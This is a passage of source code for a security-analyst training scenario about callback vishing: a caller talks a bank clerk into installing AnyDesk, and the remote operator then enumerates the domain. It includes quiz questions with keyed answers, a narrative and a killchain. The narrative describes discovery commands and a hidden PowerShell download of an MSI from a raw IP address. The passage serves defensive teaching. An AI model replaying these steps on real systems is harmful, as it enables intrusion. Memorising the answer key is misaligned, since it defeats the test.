        "The two sessions are the same class of activity, so the verdict turns on provenance. ScreenConnect is the bank's sanctioned RMM (its client sits under Program Files, not a Downloads folder), it maps to INC0092233 which the machine's own user opened through the portal, and it was operated by internal technician m.brandt — every link in that chain is accountable. The AnyDesk case inverts all three: an RMM the estate does not carry, run from Downloads, tied to a phone-contact ticket the operator effectively induced, and driven by an external session ID. (b) is a red herring — both relay over TLS/443, and encryption is not what makes a session legitimate. (c) reverses cause and effect: the severity labels are a consequence of the analysis, not evidence for it. (d) invents a timing contrast that the records do not show and that would not be decisive anyway.",
    },
    {
      id: "q4",
      prompt:
        "Once the session was live, what did the operator actually do on WKS-QB-047? Read evt_vrmm_06 through evt_vrmm_09 together.",
      hint: "Group the child processes of the remote session by intent.",
      kind: "single",
      options: [
        { value: "recon_stage", label: "Ran account and domain reconnaissance (whoami, net group \"Domain Admins\", nltest domain trusts) and then staged follow-on tooling via PowerShell" },
        { value: "encrypt", label: "Encrypted files on the workstation and deleted volume shadow copies to prepare a ransomware payload" },
        { value: "cred_dump", label: "Dumped credentials from LSASS memory and extracted cached password hashes from the local host" },
        { value: "exfil_docs", label: "Collected and uploaded the user's documents to an external cloud storage service over the AnyDesk channel" },
      ],
      answer: "recon_stage",
      xp: 60,
      explanation:
        "The four child processes spell out one intent. whoami /all (T1033) establishes what the current account holds; net group \"Domain Admins\" /domain (T1087.002) enumerates the directory's most privileged group; nltest /domain_trusts (T1482) maps the domain's trust relationships; then a hidden PowerShell (T1059.001) pulls qb-agent.msi from an external IP. That is discovery followed by tooling staging — the opening moves of a hands-on intrusion, not the payoff. (b), (c) and (d) each describe activity that would leave very different artefacts — vssadmin/encryption writes, an LSASS access, or a bulk outbound upload — and none of those appear anywhere in the timeline. Reading only what the events show keeps you from inventing a later stage that has not happened yet.",
    },
    {
      id: "q5",
      prompt:
        "You are scoping containment. AnyDesk is signed and legitimate, the operator has enumerated Domain Admins and staged an MSI, and access arrived through the help desk. Which response fits the evidence?",
      hint: "The tool being legitimate does not make the session safe. Think about the live channel, the account, the staged file, and the process that was abused.",
      kind: "single",
      options: [
        { value: "isolate_kill_hunt", label: "Isolate WKS-QB-047 to sever the live session, reset p.roth and revoke her sessions, remove the unmanaged AnyDesk, hunt for and contain the staged qb-agent.msi, and verify the caller out-of-band while tightening the tool-install process" },
        { value: "block_domain", label: "Block download.anydesk.com at the proxy — with the download source blocked, the operator's access is cut and the case can be closed" },
        { value: "whitelist_tool", label: "Since AnyDesk is a signed, legitimate product, approve it in the software catalogue and close the ticket as a false positive" },
        { value: "retrain_only", label: "The workstation is fine because the binary is legitimate; this only calls for retraining p.roth on phishing awareness" },
      ],
      answer: "isolate_kill_hunt",
      xp: 70,
      explanation:
        "Containment has to address the live channel, the account, the staged file and the abused process — not just the tool. Isolating WKS-QB-047 severs the operator's hands-on session immediately; resetting p.roth and revoking her sessions closes the identity the operator was acting through; removing the unmanaged AnyDesk and locating the qb-agent.msi that was staged prevents the next step; and because access came through the help desk, the caller must be verified out-of-band and the tool-install workflow tightened. (b) blocks only the download CDN, which does nothing about the session already running or the staged MSI. (c) is exactly the trap the scenario teaches against — the tool being legitimate does not make this session authorised. (d) treats the signed binary as proof of safety and ignores the enumeration and staging that already happened on the host.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title: "Callback Vishing — RMM Install to Hands-on-Keyboard Discovery",
    threat_actor: "Voice-phishing initial-access operator (help-desk impersonation, RMM-enabled)",
    attack_kind: "social_engineering",
    briefing:
      "CrowdStrike raised a High detection on WKS-QB-047: AnyDesk — a remote-access tool the bank does not deploy — was installed and began spawning enumeration commands, minutes after the IT Service Desk logged an inbound call for p.roth. Determine whether this is sanctioned remote support or an intrusion, how the tool got onto the host, and what to contain.",
    narrative: `The day before, an ordinary remote-support session ran on WKS-QB-061: the bank's approved ConnectWise ScreenConnect client, installed under Program Files, connected to relay.screenconnect.com against ticket INC0092233 — a ticket the machine's own user had opened through the portal — and driven by a known internal technician, m.brandt. That is what sanctioned remote support looks like, and it is the yardstick for everything that follows.

At 13:20 the IT Service Desk logged ticket INC0092571 for p.roth, a payments operations clerk. According to the record, someone identifying themselves as IT security had phoned her to say her account was flagged and that she needed to install a remote-support tool so they could "secure the workstation". She was directed to download AnyDesk and share the connection, and the record even captured the external session ID she was told to read out, 793 041 268. This is callback vishing (T1566.004): the operator never touched the machine — they talked the employee into opening the door.

Three minutes later, at 13:23, the Zscaler proxy allowed a download of AnyDesk.exe from download.anydesk.com. At 13:24 p.roth launched it from her Downloads folder. Falcon recorded the binary as fully signed and trusted (AnyDesk Software GmbH) — because it is genuinely the real AnyDesk, not malware. Nothing about the file is wrong; everything about the context is. AnyDesk is not deployed anywhere in the bank's estate, its approved remote tool is ScreenConnect, and this copy was run interactively from a user folder immediately after an unsolicited call. The tool then connected out to the AnyDesk cloud relay relay-fra-3.net.anydesk.com over 443 (T1219), and Defender for Endpoint independently logged the same relay connection from the host side.

With the operator now on the keyboard, the session went to work. cmd.exe spawned by AnyDesk ran whoami /all (T1033), then net group "Domain Admins" /domain (T1087.002), then nltest /domain_trusts /all_trusts (T1482) — identity, privileged-group and trust reconnaissance a payments clerk's workstation has no reason to perform. At 13:32 AnyDesk spawned a hidden PowerShell that used Invoke-WebRequest to pull qb-agent.msi from a raw-IP host, 45.86.230.14, into the user's Temp folder (T1059.001) — staging follow-on tooling. Two minutes later Falcon correlated the unmanaged RMM, the external session, and the discovery burst into a single High detection.

The case is deliberately uncomfortable for an analyst who trusts signatures: the binary at the centre of it verifies perfectly. The verdict comes only from reading the tool against its context — an RMM the org does not use, installed on the word of an inbound caller, driving an external operator's discovery of the domain — and against the sanctioned ScreenConnect session that proves the same shape can be entirely legitimate when the provenance is accountable.`,
    learning_objectives: [
      "Recognise callback/voice-phishing (vishing) as a top real-world initial-access vector: an unsolicited inbound 'IT' call that talks an employee into installing a remote-access tool and sharing the session",
      "Judge a signed, legitimate RMM binary by its context rather than its signature — an unmanaged tool the org does not deploy, run from a user folder right after an inbound call and driven by an external operator ID, is malicious regardless of a trusted code signature",
      "Read a hands-on-keyboard discovery burst (whoami, net group \"Domain Admins\", nltest domain trusts) spawned by a remote-access tool as an operator enumerating identity, privilege and domain trust",
      "Distinguish a sanctioned remote-support session (managed RMM, user-opened ticket, known internal technician) from an abusive one that shares the identical 'RMM ran + remote session' shape",
      "Scope containment for an RMM-enabled intrusion: isolate the host and sever the session, reset the targeted user, remove the unmanaged tool, hunt the staged follow-on tooling, and verify the caller out-of-band",
    ],
    alerts: [],
    events,
    iocs,
    killchain: [
      { ts: "2026-06-15T14:05:00.000Z", phase: "Baseline", action: `Sanctioned ScreenConnect remote-support session on ${benign.hostname} — approved RMM, user-opened ticket ${benignTicket}, internal technician ${benignTech}` },
      { ts: T(0), phase: "Initial Access", action: `Inbound 'IT security' call induces ${vishTicket} for ${victim.sam}: install a remote-support tool and share the session (T1566.004)` },
      { ts: T(3 * MIN), phase: "Initial Access", action: `AnyDesk.exe downloaded from ${downloadHost} through the proxy` },
      { ts: T(4 * MIN), phase: "Command and Control", action: `${victim.sam} runs AnyDesk.exe from Downloads — signed, trusted, but an RMM the bank does not deploy (T1219)` },
      { ts: T(5 * MIN), phase: "Command and Control", action: `AnyDesk tunnels out to the cloud relay ${relayHost} — the external operator's hands-on channel (T1219)` },
      { ts: T(7 * MIN), phase: "Discovery", action: "whoami /all — the operator enumerates the current account (T1033)" },
      { ts: T(8 * MIN), phase: "Discovery", action: 'net group "Domain Admins" /domain — privileged-group enumeration (T1087.002)' },
      { ts: T(9 * MIN), phase: "Discovery", action: "nltest /domain_trusts /all_trusts — domain trust mapping (T1482)" },
      { ts: T(12 * MIN), phase: "Execution", action: `AnyDesk spawns hidden PowerShell to stage qb-agent.msi from ${stagingIp} (T1059.001)` },
      { ts: T(14 * MIN), phase: "Detection", action: "Falcon correlates the unmanaged RMM, external session and discovery burst into a High detection" },
    ],
    questions,
  };
}
